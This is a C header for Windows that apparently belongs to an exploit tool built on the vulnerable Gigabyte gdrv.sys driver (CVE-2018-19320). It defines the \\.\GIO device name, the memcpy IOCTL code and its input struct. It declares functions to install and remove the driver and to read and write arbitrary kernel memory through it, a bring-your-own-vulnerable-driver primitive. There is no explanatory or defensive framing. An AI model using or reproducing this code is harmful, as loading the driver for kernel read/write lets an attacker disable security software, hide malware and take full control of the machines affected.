#pragma once
#include <windows.h>

// gdrv.sys (Gigabyte GIO) - CVE-2018-19320
// Device: \\.\GIO
// Single IOCTL for kernel virtual memcpy

#define GIO_DEVICE_NAME     L"\\\\.\\GIO"
#define GIO_SERVICE_NAME    L"GIO"
#define IOCTL_GIO_MEMCPY    0xC3502808

#pragma pack(push, 1)
typedef struct _GIO_MEMCPY_INPUT {
    ULONG_PTR Dest;
    ULONG_PTR Src;
    DWORD     Size;
} GIO_MEMCPY_INPUT, * PGIO_MEMCPY_INPUT;
#pragma pack(pop)

// Driver management
BOOL gio_install(LPCWSTR driver_path);
BOOL gio_uninstall(void);

// Kernel R/W via GIO memcpy IOCTL
HANDLE gio_open(void);
void   gio_close(HANDLE h);
BOOL   gio_read_kernel(HANDLE h, ULONG_PTR kaddr, PVOID buf, DWORD size);
BOOL   gio_write_kernel(HANDLE h, ULONG_PTR kaddr, PVOID buf, DWORD size);